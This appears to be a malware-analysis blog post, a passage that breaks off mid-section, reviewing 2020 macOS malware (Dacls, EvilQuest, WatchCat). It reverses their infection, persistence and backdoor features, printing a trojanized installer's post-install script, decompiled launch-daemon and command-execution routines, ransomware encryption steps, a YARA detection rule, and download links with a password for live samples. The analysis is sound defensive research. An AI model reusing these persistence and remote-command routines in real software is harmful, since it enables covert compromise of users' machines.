{
    "id": "b97bfaf3-15bb-4b6a-a1cf-b4f371f4243c",
    "created_at": "2023-01-12T15:03:17.39552Z",
    "updated_at": "2025-03-27T02:17:23.684047Z",
    "deleted_at": null,
    "sha1_hash": "7f9a0d22c62685ec3cc2c2436299ee6e88bfbad0",
    "title": "2021-01-01 - The Mac Malware of 2020 - a comprehensive analysis of the year's new malware",
    "authors": "",
    "file_creation_date": "2022-05-29T01:23:42Z",
    "file_modification_date": "2022-05-29T01:23:42Z",
    "file_size": 11102843,
    "plain_text": "# Objective-See's Blog\n\n**objective-see.com/blog/blog_0x5F.html**\n\nThe Mac Malware of 2020 üëæ\n\na comprehensive analysis of the year's new malware\n\nby: Patrick Wardle / January 1, 2021\n\nüìù üëæ Want to play along?\n[All samples covered in this post are available in our malware collection.](https://objective-see.com/malware.html)\n\n‚Ä¶just make sure not to infect yourself!!\n\n## üñ® Printable\n\nA printable (PDF) version of this report can be downloaded here:\n\n[The Mac Malware of 2020.pdf](https://objective-see.com/downloads/MacMalware_2020.pdf)\n\n## ‚åõ Background\n\nGoodbye, and good riddance 2020 ‚Ä¶and hello 2021! ü•≥\n\nIn recent years, malicious programs targeting macOS have grown in prevalence (and\nsophistication), perhaps even reaching parity with Microsoft Windows platforms. This is well\n[illustrated in Malwarebytes‚Äô ‚Äú2020 State of Malware Report‚Äù:](https://resources.malwarebytes.com/files/2020/02/2020_State-of-Malware-Report-1.pdf)\n\n\"And for the first time ever, Macs outpaced Windows PCs in number of threats\ndetected per endpoint.\" -Malwarebytes\n\n\n-----\n\nThreats per\n\nendpoint, Macs vs. Windows (credit: Malwarebytes)\nIt is important to note these statistics include both adware (and potentially unwanted\nprograms). And the reality is, if a Mac user is infected with malicious code, more than likely it\nwill be adware (vs. a sophisticated nation-state backdoor):\n\n\"The vast majority of threats for macOS in [recent years] were in the AdWare\ncategory.\" -Kaspersky\n\nHowever, it is wise not to underestimate the potential impact of adware, upon its victims. The\nnoted security researcher, [Thomas Reed articulates this well in writeup titled ‚ÄúMac adware is](https://twitter.com/thomasareed)\nmore sophisticated and dangerous than traditional Mac malware‚Äù:\n\n\"However, adware and PUPs can actually be far more invasive and dangerous on the\nMac than ‚Äúreal‚Äù malware. They can intercept and decrypt all network traffic, create\nhidden users with static passwords, make insecure changes to system settings, and\ngenerally dig their roots deep into the system so that it is incredibly challenging to\neradicate completely.\" -Thomas Reed\n\n‚Ä¶now, back to malware! For the fifth year in a row, I‚Äôve decided to put together a blog post\nthat aims to comprehensively cover all the new Mac malware that appeared during the\ncourse of the year. While the malware may have been reported on before (i.e. by the AV\ncompany that discovered them), this blog aims to cumulatively and comprehensively cover\nall the new Mac malware of 2020 in one place ‚Ä¶yes, with samples of each malware for\ndownload, so that you can play along! #SharingIsCaring\n\nIn this blog post, we focus on new Mac malware specimens or new variants that appeared in\n2020. Adware and/or malware from previous years, are not covered.\n\n\n-----\n\nHowever at the end of this blog, I ve included a brief section dedicated to these other threats,\nthat includes links to detailed write-ups.\n\nFor each malicious specimen covered in this post, we‚Äôll identify the malware‚Äôs:\n\n**Infection Vector:**\nHow it was able to infect macOS systems.\n\n**Persistence Mechanism:**\nHow it installed itself, to ensure it would be automatically restarted on reboot/user login.\n\n**Features & Goals:**\nWhat was the purpose of the malware? a backdoor? a cryptocurrency miner? or\nsomething more insidious‚Ä¶\n\nAlso, for each malware specimen, I‚Äôve added a direct download link in case you want to\nfollow along with our analysis or dig into the malware more!\n\nI‚Äôd personally like to thank the following organizations, groups, and researchers for their\nwork, analysis, & assistance! ÔøΩ\n\n[VirusTotal.](https://www.virustotal.com/)\n\n[@thomasareed,](https://twitter.com/thomasareed) [@morpheus______,](https://twitter.com/Morpheus______) [@philofishal, and others who choose to remain](https://twitter.com/philofishal)\nunnamed.\n\n## üõ† Malware Analysis Tools & Tactics\n\nThroughout this blog, we‚Äôll reference various tools used in analyzing the malware specimens.\n\nThese include:\n```\n   ProcessMonitor\n\n```\n[Our user-mode (open-source) utility that monitors process creations and terminations,](https://github.com/objective-see/ProcessMonitor)\nproviding detailed information about such events.\n```\n   FileMonitor\n\n```\n[Our user-mode (open-source) utility monitors file events (such as creation,](https://github.com/objective-see/FileMonitor)\nmodifications, and deletions) providing detailed information about such events.\n```\n   WhatsYourSign\n\n```\n[Our (open-source) utility that displays code-signing information, via the UI.](https://github.com/objective-see/WhatsYourSign)\n```\n   Netiquette\n\n```\n[Our (open-source) network monitor](https://github.com/objective-see/Netiquette)\n\n\n-----\n\n```\n   lldb\n\n```\nThe de-facto commandline debugger for macOS. Installed (to `/usr/bin/lldb ) as`\npart of Xcode.\n```\n   Hopper Disassembler\n\n```\nA ‚Äúreverse engineering tool (for macOS) that lets you disassemble, decompile and\ndebug your applications‚Äù ‚Ä¶or malware specimens!\n\nüìö Interested in general Mac malware analysis techniques?\n...you're in luck, as I've written an entire (free) book on this very topic:\n\n[The Art Of Mac Malware, Vol. 0x1: Analysis](https://taomm.org/)\n\n## üóì Timeline\n\nDacls\n\n```\n05/2020\n\n```\n\nA macOS port of a Lazarus group cross-platform backdoor.\n\nEvilQuest\n\n```\n06/2020\n\n```\n\nA insidious virus, will ransomware capabilities.\n\n**WatchCat**\n\n```\n07/2020\n\n```\n\nThe latest Lazarus APT group backdoor.\n\n**XCSSET**\n\n```\n08/2020\n\n```\n\nTargeting developers this malware leverages various 0days to steal passwords and\nexfiltrate data.\n\n\n-----\n\n**FinSpy**\n\n```\n09/2020\n\n```\n\nA commercial cross-platform implant, supporting a myriad of cyber espionage features\n& capabilities.\n\n**IPStorm**\n\n```\n10/2019\n\n```\n\nA cross platform botnet, ...now ported to macOS.\n\n**GravityRAT**\n\n```\n11/2019\n\n```\n\nA cross-platform first-stage downloader for a RAT, ...now ported to macOS.\n\n## üëæ OSX.Dacls\n\nDacls is a macOS port of the cross-platform Dacls RAT (created by the Lazarus APT group),\nwhich affords a remote attacker complete control over an infected system.\n\n[Download: OSX.Dacls (password:](https://objective-see.com/downloads/malware/Dacls.zip) `infect3d )`\n\nDacls originally was discovered in 2019, but at that time was only seen targeting Windows\nand Linux systems:\n\n\"Dacls is a RAT that was discovered by Qihoo 360 NetLab in December 2019 as a fully\nfunctional covert remote access Trojan targeting the Windows and Linux platforms.\" Malwarebytes\n\n\n-----\n\n‚Ä¶in 2020, MalwareBytes uncovered a macOS variant.\n\n**Writeups:**\n\n**Infection Vector: Trojanized (2FA) Application**\n\nMalwareBytes, who uncovered the Mac variant of `OSX.Dacls, note:`\n\n\"[the] Mac version is ...distributed via a Trojanized two-factor authentication application\nfor macOS called MinaOTP\"\n\nThe trojanized application was (re)named `TinkaOTP, and distributed via disk image`\n\n```\nTinkaOTP.dmg\n\n```\n\n‚Ä¶it is likely that the attackers relied on social engineering efforts, having to coerce macOS\nusers to download and run trojanized application. This is the de-factor infection mechanism\nleveraged by Lazarus group for many years (to target macOS users).\n\nFor example back in 2018, after creating a fake crypto-currency site, they emailed users with\nlinks to download `OSX.AppleJeus :`\n\nOSX.AppleJeus infection vector\nThe application, `TinkaOTP.app is signed ‚Äúadhoc-ly‚Äù (as the Lazarus group often does):`\n\n\n-----\n\n```\n$ codesign dvvv /Volumes/TinkaOTP/TinkaOTP.app \nExecutable=/Volumes/TinkaOTP/TinkaOTP.app/Contents/MacOS/TinkaOTP\nIdentifier=com.TinkaOTP\nFormat=app bundle with Mach-O thin (x86_64)\n...\nSignature=adhoc\n\n```\nThis also means that on modern versions of macOS (unless some exploit is first used to gain\ncode execution on the target system), the application will not (easily) run:\n\nmacOS blocking\n\nTinkaOTP.app\nLet‚Äôs now take a closer look at the application bundle of `TinkaOTP.app :`\n\nTinkaOTP Application\n\nBundle\nIf the user runs the (trojanized) application, infection will commence. Specifically,\n```\n/Contents/MacOS/TinkaOTP binary will copy a file from within its application bundle\n\n```\n( Resources/Base.lproj/SubMenu.nib ), to `~/Library/.mina and then executing it.`\n\n[This can be passively observed via our ProcessMonitor:](https://objective-see.com/products/utilities.html#ProcessMonitor)\n\n\n-----\n\n```\n# ProcessMonitor.app/Contents/MacOS/ProcessMonitor pretty\n{\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_EXEC\",\n \"process\" : {\n  \"pid\" : 864\n  \"path\" : \"/bin/cp\",\n  \"arguments\" : [\n   \"cp\",\n   \"/Volumes/TinkaOTP/TinkaOTP.app/Contents/Resources/Base.lproj/SubMenu.nib\",\n   \"/Users/user/Library/.mina\"\n  ]\n  ...\n }\n}\n{\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_EXEC\",\n \"process\" : {\n  \"pid\" : 866\n  \"path\" : \"/Users/user/Library/.mina\",\n  \"arguments\" : [\n   \"/Users/user/Library/.mina\"\n  ]\n  ...\n }\n}\n\n```\n**Persistence: Launch Item**\n```\nOSX.Dacls persists as a launch item ( com.aex.lop.agent.plist ).\n\n```\nIf running as root, it will persists as a launch daemon, otherwise, as a user launch agent.\n\nThe binary `SubMenu.nib (which recall, was copied to` `~/Library/.mina ) contains both a`\ntemplate for, and path to, the persistent launch item property list:\n\n\n-----\n\nOSX.Dacl's launch item template\n\nOSX.Dacl's launch item path\nVia our `FileMonitor, one can passively observe the malware creating the launch item (here`\na user launch agent, `~/Library/LaunchAgents/com.aex-loop.agent.plist ):`\n```\n# FileMonitor/Contents/MacOS/FileMonitor -pretty\n{\n \"event\" : \"ES_EVENT_TYPE_NOTIFY_CREATE\",\n \"file\" : {\n  \"destination\" : \"/Users/user/Library/LaunchAgents/com.aex-loop.agent.plist\",\n  \"process\" : { \n   \"path\" : \"/Users/user/Library/.mina\",\n   \"pid\" : 931\n   ...\n  }\n }\n}\n\n```\nAs the value for the `RunAtLoad key in` `com.aex-loop.agent.plist is set to true, the`\nmalware will be automatically (re)started by macOS each time the system is rebooted (and\nthe user logs in).\n\n**Capabilities: Persistent Backdoor (+ plugins).**\n\n\n-----\n\nWe noted that `OSX.Dacls is a macOS port of a Windows/Linux RAT. The initial report on`\nthe (Windows/Linux versions of the) Dacls RAT, was published in December 2019, by Netlab.\n[Titled, ‚ÄúDacls, the Dual platform RAT‚Äù. In terms of the RATs capabilities, the report noted it](https://blog.netlab.360.com/dacls-the-dual-platform-rat-en/)\nutilizes a modular plugin architecture:\n\n\"[Dacls] uses static compilation to compile the plug-in and Bot code together. By\nsending different instructions to call different plug-ins, various tasks can be completed.\nThe main functions of ‚Ä¶Dacls Bot include: command execution, file management,\nprocess management, test network access, C2 connection agent, network scanning\nmodule.\" -Netlab\n\nThe report describes various plugins such as a:\n\nFile plugin\nProcess plugin\n‚ÄúTest‚Äù plugin\n‚ÄúReverse P2P‚Äù plugin\n‚ÄúLogSend‚Äù plugin\n\nAnalyzing the malware‚Äôs disassembly (specifically searching for `LoadPlugin_ * functions),`\nwe can see that the macOS variant of Dacls supports these same plugins (plus several\nothers, such as SOCKS plugin):\n\nOSX.Dacl's Plugins\n\nVia these plugins a remote attackers can interact with and fully control an infected system\nby:\n\nExecuting system commands\nProcess actions, such as listing, creating, & terminating\n\n\n-----\n\nFile action such as upload/download, read/write, & deleting\n‚Ä¶and more (such as performing network scans).\n\nFor more details on the plugins and their implementation, see Netlab‚Äôs report:\n\n[\"Dacls, the Dual platform RAT\"](https://blog.netlab.360.com/dacls-the-dual-platform-rat-en/)\n\n## üëæ OSX.EvilQuest\n\nEvilQuest (also known as ThiefQuest) is a (true) computer virus, that also provides remote\ntasking and ransomware logic.\n\n[Download: OSX.EvilQuest (password:](https://objective-see.com/downloads/malware/EvilQuest.zip) `infect3d )`\n\n[The noted Malware researcher Dinesh Devadoss discovered](https://twitter.com/dineshdina04) `OSX.EvilQuest and tweeted`\nabout its ransomware tendencies and impersonation as Google Software update:\n\n[#macOS](https://twitter.com/hashtag/macOS?src=hash&ref_src=twsrc%5Etfw) [#ransomware impersonating as Google Software Update program with zero](https://twitter.com/hashtag/ransomware?src=hash&ref_src=twsrc%5Etfw)\ndetection.\n\nMD5:\n\n522962021E383C44AFBD0BC788CF6DA3 6D1A07F57DA74F474B050228C6422790\n[98638D7CD7FE750B6EAB5B46FF102ABD@philofishal](https://twitter.com/philofishal?ref_src=twsrc%5Etfw) [@patrickwardle](https://twitter.com/patrickwardle?ref_src=twsrc%5Etfw)\n[@thomasareed](https://twitter.com/thomasareed?ref_src=twsrc%5Etfw) [pic.twitter.com/r5tkmfzmFT](https://t.co/r5tkmfzmFT)\n\n[‚Äî Dinesh_Devadoss (@dineshdina04) June 29, 2020](https://twitter.com/dineshdina04/status/1277668001538433025?ref_src=twsrc%5Etfw)\n\nFurther analysis uncovered other insidious capabilities, including the ability to virally infected\nother binaries on an infected system!\n\n**Writeups:**\n\n[‚ÄúOSX.EvilQuest Uncovered (Part 1)‚Äù](https://objective-see.com/blog/blog_0x59.html)\n\n\n-----\n\n[OSX.EvilQuest Uncovered (Part 2)](https://objective-see.com/blog/blog_0x60.html)\n\n[‚ÄúUpdates on ThiefQuest, the Quickly-Evolving macOS Malware‚Äù](https://blog.trendmicro.com/trendlabs-security-intelligence/updates-on-thiefquest-the-quickly-evolving-macos-malware/?utm_source=feedburner)\n\n**Infection Vector: Pirated Software**\n\nFrom Dinesh‚Äôs [tweet, it was not apparent how the malware was able to infect macOS users.](https://twitter.com/dineshdina04/status/1277668001538433025)\nHowever, [Thomas Reed of Malwarebytes, noted that the malware had (also?) been found in](https://twitter.com/thomasareed?lang=en)\npirated versions of popular macOS software, shared on popular torrent sites:\n\nPirated\n\nApplication, Infected with OSX.EvilQuest (credit: Malwarebytes)\n\nEthical reasons aside, it's generally unwise to install pirated software, as it is often infected\nwith malware.\n‚ÄúTorrent sites are notorious for distributing malware and adware, sometimes through\nmisleading advertisements, and sometimes through Trojan horse downloads that claim to be\n‚Äòcracks‚Äô or that may contain infected copies of legitimate software‚Äù -Intego\n\nThe sample analyzed here, was packaged in a pirated version of the popular DJ software\n[Mixed In Key. The malicious package was unsigned ‚Ä¶meaning macOS will prompt the user](https://mixedinkey.com/)\nbefore allowing it to be opened:\n\n\n-----\n\nOSX.EvilQuest Infection Vector\nHowever, macOS users attempting to pirate software will likely ignore this warning, pressing\nonwards ‚Ä¶ensuring infection commences.\n\n[We can use the Suspicious Package utility to statically examine the package contetns. It](https://mothersruin.com/software/SuspiciousPackage/)\ncontains an application named `Mixed In Key 8 and binary named ‚Äú patch ‚Äù:`\n\nClicking on the ‚ÄúAll Scripts‚Äù tab, we find also find a post install script:\n\n\n-----\n\n```\n1#!/bin/sh\n2mkdir /Library/mixednkey\n3\n4mv /Applications/Utils/patch /Library/mixednkey/toolroomd\n5rmdir /Application/Utils\n6\n7chmod +x /Library/mixednkey/toolroomd\n8\n9/Library/mixednkey/toolroomd &\n\n```\nThis post install script (which is executed during the package installation) will first create a\n```\n/Library/mixednkey directory. Then, it moves the patch binary into this directory\n\n```\n(renaming it `toolroomd ), sets it to be executable ‚Ä¶and then launches it.`\n\nAs the installer requests root privileges during the install, this script (and thus the\n```\ntoolroomd binary) will also run with root privileges:\n\n```\nAs the \"Mixed In Key 8\" binary is (still) validly signed by the Mixed In Key developers, it is\nlikely pristine and unmodified\n‚Ä¶the malicious components of the package, are thus the post install script and the patch\nbinary.\n\n**Persistence: Launch Item**\n\nDepending on its privilege level, `OSX.EvilQuest persists either as a user launch agent, or`\na launch daemon (and a launch agent). The code responsible for this logic is found within a\nfunction named `ei_persistence_main .`\n\n\n-----\n\nAfter invoking various anti-analysis logic (e.g. debugger check), the function then invokes a\nhelper function, `persist_executable to install the malware. If the malware is running with`\nnon-root privileges it copy itself to `~/Library/AppQuest/com.apple.questd . However, if`\nrunning as root, it will also copy itself to `/Library/AppQuest/com.apple.questd .`\n\nOnce the malware has copied itself, it persists via a launch item. The code that performs this\npersistence is found in the `install_daemon function (invoked by`\n```\nei_persistence_main ). If running as non-root, it persists as a launch agent:\n~/Library/LaunchAgents/com.apple.questd.plist . If the malware is running with root\n\n```\nprivileges it will invoke the `install_daemon function again, but this time specifying that a`\nlaunch daemon should be created.\n\nAfter the malware has ensured it is persisted (twice, if running as root!), it invokes the\n```\nei_selfretain_main function to start the launch item(s). This function invokes the aptly\n\n```\nnamed `run_daemon which in turn invokes macOS‚Äôs` `osascript binary to launch the items`\nvia an AppleScript command:\n\nOSX.EvilQuest launch item persistence\n\nThe template for the property list for these launch item(s) is stored as an encrypted string\nwithin the malware.\n\nAs the `RunAtLoad is set to true in the malware‚Äôs launch item plist`\n( com.apple.questd.plist ), macOS will automatically restart the malware on subsequent\nreboots.\n\n**Capabilities: File Exfiltration, Remote Tasking, Ransomware, Viral Infection ...and**\n\nmore!\n\n\n-----\n\nOne of the first actions taking by `OSX.EvilQuest, is to scan an infected system for various`\nfiles that match a list of embedded regular expressions. From these regexes, we can\nascertain that the malware has a propensity for certificates and crypto-currency keys &\nwallets:\n\nOSX.EvilQuest's file exfiltration\nAny file on the infected system that matches any of these regexes will be exfiltrated to the\nattacker (including, as shown above, a test file, `key.png ).`\n\nThe malware also supports remote tasking, including the following:\n\n\n-----\n\nTask `0x1 :` `react_exec`\n\nThe `react_exec command appears to execute a payload received from the server.`\nInterestingly it attempts to first execute the payload directly from memory! Specifically it\ninvokes a function named `ei_run_memory_hrd which invokes the Apple`\n```\nNSCreateObjectFileImageFromMemory, NSLinkModule,\nNSLookupSymbolInModule, and NSAddressOfSymbol APIs to load and link the in\n```\nmemory payload.\n\n[At a previous BlackHat talk (‚ÄúWriting Bad @$$ Malware for OS X‚Äù), I discussed this](https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf)\ntechnique (an noted Apple used to host sample code to implement such in-memory\nexecution):\n\nIf the in-memory execution fails, the malware writes out the payload to a file named\n```\n.xookc, sets it to be executable (via chmod ), then executes via a call to system .\n\n```\nTask `0x2 :` `react_save`\n\nThe `react_save decodes data received from the server and saves it to a file. It`\nappears the file name is specified by the server as well. In some cases the file will be\nset to executable via a call to `chmod .`\n\nTask `0x4 :` `react_start`\n\nThis method is a nop, and does nothing:\n```\n1int react_start(int arg0) {\n2  return 0x0;\n3}\n\n```\n\n-----\n\nTask `0x8 :` `react_keys`\n\nThe `react_keys command starts a keylogger. Specifically it instructs the malware to`\nspawn a background thread to execute a function named\n```\n   eilf_rglk_watch_routine . This function creates an event tap (via the\n   CGEventTapCreate API), add it to the current runloop, then invokes the\n   CGEventTapEnable to activate the event tap.\n\n```\nOnce the tap is activated, keypresses (e.g. by the user) will be delivered to the\n```\n   process_event function, which then converts the the raw keypresses ‚Äúreadable‚Äù key\n\n```\ncodes (via the `kconvert function). Somewhat interestingly, the malware then passes`\nthe converted key code to the `printf function ‚Ä¶to print them out? (You‚Äôd have thunk`\nit would write them to a file ‚Ä¶). Perhaps this part of code is not quite done (yet)!\n\nTask `0x10 :` `react_ping`\n\nThe `react_ping command simply compares a value from the server with the (now`\ndecrypted) string `\"Hi there\" . A match causes this command to return ‚Äúsuccess‚Äù,`\nwhich likely just causes the malware to respond to the server for (more) tasking.\n\nTask `0x20 :` `react_host`\n\nThis method is a nop, and does nothing:\n```\n   1int react_host(int arg0) {\n   2  return 0x0;\n   3}\n\n```\nTask `0x40 :` `react_scmd`\n\nThe `react_scmd command will execute a command from the server via the` `popen`\nAPI:\n```\n   1__text:0000000100009EDD         mov   rdi, [rbp+var_18] ; char *\n   2__text:0000000100009EE1         lea   rsi, aR     ; \"r\"\n   3__text:0000000100009EE8         mov   [rbp+var_70], rax\n   4__text:0000000100009EEC         call  _popen\n\n```\nThe response (output) of the command is read, and transmitted about to the server via\nthe `eicc_serialize_request and` `http_request functions.`\n\nThe most readily observable side-affect of an `OSX.EvilQuest infection is its file encryption`\n(ransomware) activities.\n\nAfter the malware has invoked a method named `_s_is_high_time and waited on several`\ntimers to expire, it begins encrypting the (unfortunate) user‚Äôs files, by invoking a function\nnamed `carve_target .`\n\n\n-----\n\nThe `carve_target first begins the key generation process via a call to the` `random API,`\nand functions named `eip_seeds and` `eip_key . It then generates a list of files to encrypt,`\nby invoking the `get_targets function, passing in the` `is_file_target as a filter`\nfunction. This filter function filters out all files, except those that match certain file extensions.\nThe encrypted list of extensions is hard-coded in the malware.\n\nArmed with a list of target files (that match the above extensions), the malware completes\nthe key generation process (via a call to `random_key, which in turn calls` `srandom and`\n```\nrandom ), before calling a function named carve_target on each file.\n\n```\nThe `carve_target function is invoked with the path of the file to encrypt, the result of the`\ncall to `random_key, as well as values from returned by the calls to` `eip_seeds and`\n```\neip_key .\n\n```\nIt takes the following actions:\n\n1. Makes sure the file is accessible via a call to `stat`\n2. Creates a temporary file name, via a call to a function named `make_temp_name`\n3. Opens the target file for reading\n4. Checks if the target file is already encrypted via a call to a function named `is_carved`\n\n(which checks for the presence of `BEBABEDD at the end of the file).`\n5. Open the temporary file for writing\n6. Read(s) 0x4000 byte chunks from the target file\n7. Invokes a function named `tpcrypt to encrypt the (0x4000) bytes`\n8. Write out the encrypted bytes to the temporary file\n9. Repeats steps 6-8 until all bytes have been read and encrypted from the target file\n10. Invokes a function named `eip_encrypt to encrypt (certain?) keying information`\n\nwhich is then appended to the temporary file\n11. Writes `0DDBEBABE to end of the temporary file (as noted by Dinesh Devadoss)`\n12. Deletes the target file\n13. Renames the temporary file to the target file\n\n\n-----\n\nOSX.EvilQuest's file ransom logic\nOnce all the files in the list of target files have been encrypted, the malware writes out the\nfollowing to a file named `READ_ME_NOW.txt :`\n\nOSX.EvilQuest's ransom note\nTo make sure the user reads this file, it displays the following modal prompt, and reads it\naloud via macOS built-in `say command:`\n\n\n-----\n\nOSX.EvilQuest's ransom alert\n\nThe encryption logic was broken by researchers at SentinelOne:\n\n[\"Breaking EvilQuest | Reversing A Custom macOS Ransomware File Encryption Routine\"](https://labs.sentinelone.com/breaking-evilquest-reversing-a-custom-macos-ransomware-file-encryption-routine/)\nMoreover, the ransomware logic has been removed in subsequent versions of the malware.\n\nThe most unique feature of `OSX.EvilQuest is its capabilities to (locally) virally propagate.`\nIn short, the malware generates a list of executables on the system, the invokes a method\nnamed `append_ai to inject itself into the binary:`\n\nOSX.EvilQuest's viral infection logic\nThe following image illustrates the details of the viral infection:\n\n\n-----\n\nOSX.EvilQuest's viral infection logic\n\nTo ensure the infected binary acts ‚Äúnormal‚Äù (i.e. runs its original code so that nothing appears\namiss), the viral code writes the programs original bytes out to a new file named: .\n<orginalfilename>1. This file is then set executable (via chmod) and executed (via execl).\n\nBy injecting itself into the start of the (other) binaries on the system, the malware ensures\nthat it is rather difficult to remove!\n\n## üëæ OSX.WatchCat\n\nWatchCat appears to be a Lazarus APT group creation, that builds off previous backdoors ‚Ä¶\nwhile adding new capabilities.\n\n[Download: OSX.WatchCat (password:](https://objective-see.com/downloads/malware/WatchCat.zip) `infect3d )`\n\n[As noted by the macOS security researcher Scott Knight, information about](https://twitter.com/sdotknight/) `OSX.WatchCat`\nwas made public via the addition of an XProtect signature (version 2127):\n\n\n-----\n\nXProtect 2127 adds two new rules to detect watchcat . VT engines label it as\nNukeSpeed. Could be Lazarus related.\n3bb96bfaf492782b38985f4bd6b7e7f9dc22c1332b42bb74b16041298fd31f93\n\n‚Äî Scott Knight (@sdotknight) [July 24, 2020](https://twitter.com/sdotknight/status/1286667418283184128?ref_src=twsrc%5Etfw)\n\n[Scanning the malicious binary via UXProtect, shows a match on](https://digitasecurity.com/uxprotect/)\n```\nXProtect_MACOS_580a1bc :\n$ cd /Library/Apple/System/Library/CoreServices/\n$ cat XProtect.bundle/Contents/Resources/XProtect.yara\nrule XProtect_MACOS_580a1bc\n{\n  meta:\n   description = \"MACOS.580a1bc\"\n  strings:\n   $s1 = { 73 77 5F 76 65 72 73 20 2D 70 72 6F 64 75 63 74 4E 61 6D 65 }\n   $s2 = { 73 77 5F 76 65 72 73 20 2D 70 72 6F 64 75 63 74 56 65 72 73 69 6F 6E }\n   $s3 = { 73 77 5F 76 65 72 73 20 2D 62 75 69 6C 64 56 65 72 73 69 6F 6E }\n   $s4 = { 4D 6F 7A 69 6C 6C 61 2F 35 2E 30 20 28 4D 61 63 69 6E 74 6F 73 ... }\n   $s5 = { 63 6F 6D 2E 61 70 70 6C 65 2E 77 61 74 63 68 63 61 74 2E 70 6C 69 73 74\n}\n  condition:\n   Macho and filesize < 500KB and all of them\n}\n\n```\n**Writeups:**\n\n[‚ÄúFour Distinct Families of Lazarus Malware Target Apple‚Äôs macOS Platform‚Äù](https://www.sentinelone.com/blog/four-distinct-families-of-lazarus-malware-target-apples-macos-platform/)\n\n\n-----\n\n**Infection Vector: Unknown**\n\nUnfortunately the XProtect signature and a binary sample is all the (public) information we\nhave about `OSX.WatchCat ‚Ä¶meaning its infection vector remains unknown. However,`\nLazarus APT group (the likely authors of this malware) are rather fond of packaging up their\nbackdoors in trojanized applications:\n\n‚Ä¶thus, it‚Äôs possible that `OSX.WatchCat is distributed in a similar manner.`\n\n**Persistence: Launch Daemon**\n\nTaking a peak at the `OSX.WatchCat binary, we find an embedded launch daemon property`\nlist:\n\nThis (embedded) plist is referenced from a function named `InsertToLaunchDaemons :`\n\n\n-----\n\n```\n 1int _InsertToLaunchDaemons(int arg0, int arg1) {\n 2  plist = malloc(strlen(arg0) + 0x400);\n 3  sprintf_chk(plist, 0x0, 0xffffffffffffffff, \"<?xml version=\\\"1.0\\\"\nencoding=\\\"UTF-8\\\"?>\\n<!DOCTYPE plist PUBLIC \\\"-//Apple//DTD PLIST 1.0//EN\\\"\n\\\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\\\">\\n<plist\nversion=\\\"1.0\\\">\\n<dict>\\n<key>Label</key>\\n<string>com.apple.watchcat</string>\\n<key>\n arg0, arg1);\n 4  \n 5  sprintf_chk(path, 0x0, 0x104, \"/Library/LaunchDaemons/%s\",\n\"com.apple.watchcat.plist\");\n 6  file = fopen(path, \"wb\");\n 7  if (file != 0x0) {\n 8   fwrite(plist, strlen(plist), 0x1, rbx);\n 9   fclose(file);\n10   chmod(path, 444o);\n11  }\n12  ...\n13}\n\n```\nThe above code first formats the property lists (i.e. adds the full path the malware‚Äôs binary\nimage), and builds a path to the launch daemon\n( /Library/LaunchDaemons/com.apple.watchcat.plist ). It then writes out the (now\nconfigured) plist.\n\nAs the `RunAtLoad key is set to` `true the malware will be automatically (re)started each`\ntime the system is rebooted.\n\n‚Ä¶however the first time (i.e. prior to reboot), the malware manually starts the launch daemon\nvia the `SinLaunchCTL function. This function simply invokes` `launchctl load on the`\nlaunch daemon plist ( com.apple.watchcat.plist ):\n```\n1int SinLaunchCTL() {\n2  sprintf_chk(path, 0x0, 0x104, \"/Library/LaunchDaemons/%s\",\n\"com.apple.watchcat.plist\");\n3  sprintf_chk(command, 0x0, 0x200, \"launchctl load %s > /dev/null 2>&1 &\", path);\n4  rax = popen(command, \"r\");\n5  ...\n6}\n\n```\n**Capabilities: Backdoor, plus \"webshell\"**\n\n[Mac malware analyst Phil Stokes notes in a](https://twitter.com/philofishal) [recent writeup:](https://www.sentinelone.com/blog/four-distinct-families-of-lazarus-malware-target-apples-macos-platform/)\n\n\"...there are some overlaps with the earlier [Lazarus Group] backdoor samples ...there\nis also much more to this malware that has not been seen in the other samples,\nincluding use of a WebShell.\n\nBefore taking a look at the webshell, let‚Äôs discuss `OSX.WatchCat ‚Äôs download and execute`\nfunctionality.\n\n\n-----\n\nTo execute external commands and processes, the malware invokes the `popen system`\nAPI. By looking at cross-references (x-refs) to this API, we can find the code responsible for\nexecuting commands from the server:\n\nThe malware‚Äôs `MsgCmd function, invokes` `popen on a passed in argument:`\n```\n1int MsgCmd(int arg0) {\n2  buffer = malloc(SAR(0x1000000000 + (strlen(arg0) << 0x20), 0x20));\n3  __sprintf_chk(buffer, 0x0, 0xffffffffffffffff, \"%s 2>&1\", arg0);\n4  popen(buffer, \"r\");\n5}\n\n```\nWorking backwards, we see that the `MsgCmd function is invoked from the` `CmdProc`\nfunction. The `CmdProc first invokes the` `SendMsgOnlyType function (to send an message`\nto a remote command & control server via the `curl APIs). Then parses the response and`\nacts upon it:\n\n\n-----\n\nAs (just) noted, the `MsgCmd will executed the specified command.`\n\nOther commands appear to provide a remote attacker the ability to:\n\ndownload files\nupload files\nkill a process ( MsgPK )\ndelete a file ( MsgSdel )\n‚Ä¶and more!\n\n\n-----\n\nAs Phil noted, this is similar to the capabilities afforded by other Lazarus Group backdoors\n(such as [OSX.Yort). Also though he noted the addition of the ‚Äúuse of a WebShell.‚Äù](https://objective-see.com/blog/blog_0x53.html#osx-yort)\n\nThe ‚Äúwebshell‚Äù logic is found in the `Auth_WebShell function (which is invoked in a loop by`\nthe malware‚Äôs `Start function). It appears to be a simple check in, with a value of`\n```\n259D7B1TE1002A65 :\n 1int Auth_WebShell() {\n 2  ...\n 3  rax = rand();\n 4  _g_nBoardID = rax + -((0xffffffffe90452d5 * rax >> 0x2d) * 0x2328) + 0x3e8;\n 5  *(&var_60 + 0x8) = '56A2001E';\n 6  var_60 = 'T1B7D952';\n 7\n 8  var_A4 = rand();\n 9  rax = SendRawData(_g_HttpSetting, ..., &var_60, &var_A4, 0x4);\n10  if (rax != 0x0) {\n11      rbx = 0x0;\n12      rax = RecvRawData(&var_80, 0x4);\n13      if (rax != 0x0) {\n14          __sprintf_chk(&var_A0, 0x0, 0x20, \"%04d\", *(int32_t\n*)_g_nBoardID);\n15          rax = strcmp(&var_A0, &var_80);\n16          rbx = rax == 0x0 ? 0x1 : 0x0;\n17      }\n18  }\n19  ...\n20  return rax;\n21}\n\n```\nFor more details on OSX.WatchCat and other similar (and recent) Lazarus Group backdoors,\nsee Phil‚Äôs writeup:\n\n[\"Four Distinct Families of Lazarus Malware Target Apple‚Äôs macOS 